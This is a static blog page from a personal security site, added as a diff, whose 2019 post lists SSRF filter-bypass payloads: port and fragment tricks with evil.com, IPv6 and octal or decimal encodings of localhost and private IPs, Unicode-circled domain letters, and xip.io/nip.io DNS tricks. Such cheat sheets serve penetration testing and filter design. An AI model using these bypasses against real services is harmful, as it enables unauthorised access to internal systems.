@@ -1,0 +1,199 @@
+<!DOCTYPE html>
+<html>
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="utf-8">
+  
+
+  
+  <title>H1e4a0r1t</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <meta name="description" content="SSRF0x00.常见漏洞点 0x01.Bypass1. http://127.0.0.0:8888:80   8888为真2. http://0.0.0.0#@evil.com:803.  http://[::]4. 0://evil.com:80;http://google.com:80/5. http://[::]:80/；http://[::1]；http://[::]；http://12">
+<meta property="og:type" content="article">
+<meta property="og:title" content="H1e4a0r1t">
+<meta property="og:url" content="http://yoursite.com/2019/04/22/ssrf/index.html">
+<meta property="og:site_name" content="H1e4a0r1t">
+<meta property="og:description" content="SSRF0x00.常见漏洞点 0x01.Bypass1. http://127.0.0.0:8888:80   8888为真2. http://0.0.0.0#@evil.com:803.  http://[::]4. 0://evil.com:80;http://google.com:80/5. http://[::]:80/；http://[::1]；http://[::]；http://12">
+<meta property="og:locale" content="default">
+<meta property="og:image" content="https://i.loli.net/2019/04/15/5cb49f20c865f.png">
+<meta property="og:updated_time" content="2019-04-20T12:10:23.903Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="H1e4a0r1t">
+<meta name="twitter:description" content="SSRF0x00.常见漏洞点 0x01.Bypass1. http://127.0.0.0:8888:80   8888为真2. http://0.0.0.0#@evil.com:803.  http://[::]4. 0://evil.com:80;http://google.com:80/5. http://[::]:80/；http://[::1]；http://[::]；http://12">
+<meta name="twitter:image" content="https://i.loli.net/2019/04/15/5cb49f20c865f.png">
+  
+    <link rel="alternate" href="/atom.xml" title="H1e4a0r1t" type="application/atom+xml">
+  
+  
+    <link rel="icon" href="/favicon.png">
+  
+  
+    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
+  
+  <link rel="stylesheet" href="/css/style.css">
+</head>
+</html>
+<body>
+  <div id="container">
+    <div id="wrap">
+      <header id="header">
+  <div id="banner"></div>
+  <div id="header-outer" class="outer">
+    <div id="header-title" class="inner">
+      <h1 id="logo-wrap">
+        <a href="/" id="logo">H1e4a0r1t</a>
+      </h1>
+      
+    </div>
+    <div id="header-inner" class="inner">
+      <nav id="main-nav">
+        <a id="main-nav-toggle" class="nav-icon"></a>
+        
+          <a class="main-nav-link" href="/">Home</a>
+        
+          <a class="main-nav-link" href="/archives">Archives</a>
+        
+      </nav>
+      <nav id="sub-nav">
+        
+          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
+        
+        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
+      </nav>
+      <div id="search-form-wrap">
+        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="http://yoursite.com"></form>
+      </div>
+    </div>
+  </div>
+</header>
+      <div class="outer">
+        <section id="main"><article id="post-ssrf" class="article article-type-post" itemscope itemprop="blogPost">
+  <div class="article-meta">
+    <a href="/2019/04/22/ssrf/" class="article-date">
+  <time datetime="2019-04-22T03:40:38.439Z" itemprop="datePublished">2019-04-22</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="SSRF"><a href="#SSRF" class="headerlink" title="SSRF"></a>SSRF</h1><h2 id="0x00-常见漏洞点"><a href="#0x00-常见漏洞点" class="headerlink" title="0x00.常见漏洞点"></a>0x00.常见漏洞点</h2><p><img src="https://i.loli.net/2019/04/15/5cb49f20c865f.png" alt></p>
+<h2 id="0x01-Bypass"><a href="#0x01-Bypass" class="headerlink" title="0x01.Bypass"></a>0x01.Bypass</h2><h3 id="1-http-127-0-0-0-8888-80-8888为真"><a href="#1-http-127-0-0-0-8888-80-8888为真" class="headerlink" title="1. http://127.0.0.0:8888:80   8888为真"></a>1. <a href="http://127.0.0.0:8888:80" target="_blank" rel="noopener">http://127.0.0.0:8888:80</a>   8888为真</h3><h3 id="2-http-0-0-0-0-evil-com-80"><a href="#2-http-0-0-0-0-evil-com-80" class="headerlink" title="2. http://0.0.0.0#@evil.com:80"></a>2. <a href="http://0.0.0.0#@evil.com:80" target="_blank" rel="noopener">http://0.0.0.0#@evil.com:80</a></h3><h3 id="3-http"><a href="#3-http" class="headerlink" title="3.  http://[::]"></a>3.  http://[::]</h3><h3 id="4-0-evil-com-80-http-google-com-80"><a href="#4-0-evil-com-80-http-google-com-80" class="headerlink" title="4. 0://evil.com:80;http://google.com:80/"></a>4. 0://evil.com:80;<a href="http://google.com:80/" target="_blank" rel="noopener">http://google.com:80/</a></h3><h3 id="5-http-80-；http-1-；http-；http-127-1"><a href="#5-http-80-；http-1-；http-；http-127-1" class="headerlink" title="5. http://[::]:80/；http://[::1]；http://[::]；http://127.1"></a>5. http://[::]:80/；http://[::1]；http://[::]；<a href="http://127.1" target="_blank" rel="noopener">http://127.1</a></h3><h3 id="6-http-127-127-127-127；http-127-0-1-3；http-127-0-0-0"><a href="#6-http-127-127-127-127；http-127-0-1-3；http-127-0-0-0" class="headerlink" title="6. http://127.127.127.127；http://127.0.1.3；http://127.0.0.0"></a>6. <a href="http://127.127.127.127；http://127.0.1.3；http://127.0.0.0" target="_blank" rel="noopener">http://127.127.127.127；http://127.0.1.3；http://127.0.0.0</a></h3><h3 id="7-•http-0177-0-0-1"><a href="#7-•http-0177-0-0-1" class="headerlink" title="7. •http://0177.0.0.1/"></a>7. •<a href="http://0177.0.0.1/" target="_blank" rel="noopener">http://0177.0.0.1/</a></h3><p>•<a href="http://2130706433/" target="_blank" rel="noopener">http://2130706433/</a> = <a href="http://127.0.0.1" target="_blank" rel="noopener">http://127.0.0.1</a></p>
+<p>•<a href="http://3232235521/" target="_blank" rel="noopener">http://3232235521/</a> = <a href="http://192.168.0.1" target="_blank" rel="noopener">http://192.168.0.1</a></p>
+<p>•<a href="http://3232235777/" target="_blank" rel="noopener">http://3232235777/</a> = <a href="http://192.168.1.1" target="_blank" rel="noopener">http://192.168.1.1</a></p>
+<h3 id="8-•http-0"><a href="#8-•http-0" class="headerlink" title="8. •http://0/"></a>8. •<a href="http://0/" target="_blank" rel="noopener">http://0/</a></h3><h3 id="9-•http-example-com-example-com"><a href="#9-•http-example-com-example-com" class="headerlink" title="9. •http://ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ = example.com"></a>9. •http://ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ = example.com</h3><p>•List:</p>
+<p>•① ② ③ ④ ⑤ ⑥ ⑦ ⑧ ⑨ ⑩ ⑪ ⑫ ⑬ ⑭ ⑮ ⑯ ⑰ ⑱ ⑲ ⑳ ⑴ ⑵ ⑶ ⑷ ⑸ ⑹ ⑺ ⑻ ⑼ ⑽ ⑾ ⑿ ⒀ ⒁ ⒂ ⒃ ⒄ ⒅ ⒆ ⒇ ⒈ ⒉ ⒊ ⒋ ⒌ ⒍ ⒎ ⒏ ⒐ ⒑ ⒒ ⒓ ⒔ ⒕ ⒖ ⒗ ⒘ ⒙ ⒚ ⒛ ⒜ ⒝ ⒞ ⒟ ⒠ ⒡ ⒢ ⒣ ⒤ ⒥ ⒦ ⒧ ⒨ ⒩ ⒪ ⒫ ⒬ ⒭ ⒮ ⒯ ⒰ ⒱ ⒲ ⒳ ⒴ ⒵ Ⓐ Ⓑ Ⓒ Ⓓ Ⓔ Ⓕ Ⓖ Ⓗ Ⓘ Ⓙ Ⓚ Ⓛ Ⓜ Ⓝ Ⓞ Ⓟ Ⓠ Ⓡ Ⓢ Ⓣ Ⓤ Ⓥ Ⓦ Ⓧ Ⓨ Ⓩ ⓐ ⓑ ⓒ ⓓ ⓔ ⓕ ⓖ ⓗ ⓘ ⓙ ⓚ ⓛ ⓜ ⓝ ⓞ ⓟ ⓠ ⓡ ⓢ ⓣ ⓤ ⓥ ⓦ ⓧ ⓨ ⓩ ⓪ ⓫ ⓬ ⓭ ⓮ ⓯ ⓰ ⓱ ⓲ ⓳ ⓴ ⓵ ⓶ ⓷ ⓸ ⓹ ⓺ ⓻ ⓼ ⓽ ⓾ ⓿</p>
+<h3 id="10-•10-0-0-1-xip-io"><a href="#10-•10-0-0-1-xip-io" class="headerlink" title="10. •10.0.0.1.xip.io"></a>10. •10.0.0.1.xip.io</h3><p>•<a href="http://www.10.0.0.1.xip.io" target="_blank" rel="noopener">www.10.0.0.1.xip.io</a></p>
+<p>•mysite.10.0.0.1.xip.io</p>
+<p>•foo.bar.10.0.0.1.xip.io</p>
+<p>•nip.io</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://yoursite.com/2019/04/22/ssrf/" data-id="cjurwsu7k000134tqvr9jwh7u" class="article-share-link">Share</a>
+      
+      
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+  
+    <a href="/2019/04/22/wfuzz/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title"></div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+
+  
+    
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Archives</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/04/">April 2019</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2019/03/">March 2019</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">Recent Posts</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2019/04/22/ssrf/">(no title)</a>
+          </li>
+        
+          <li>
+            <a href="/2019/04/22/wfuzz/">(no title)</a>
+          </li>
+        
+          <li>
+            <a href="/2019/04/22/Recon/">(no title)</a>
+          </li>
+        
+          <li>
+            <a href="/2019/03/17/hello/">Hello</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2019 H1e4a0r1t<br>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+
+  <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+  <script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+<script src="/js/script.js"></script>
+
+
+
+  </div>
+</body>
+</html>
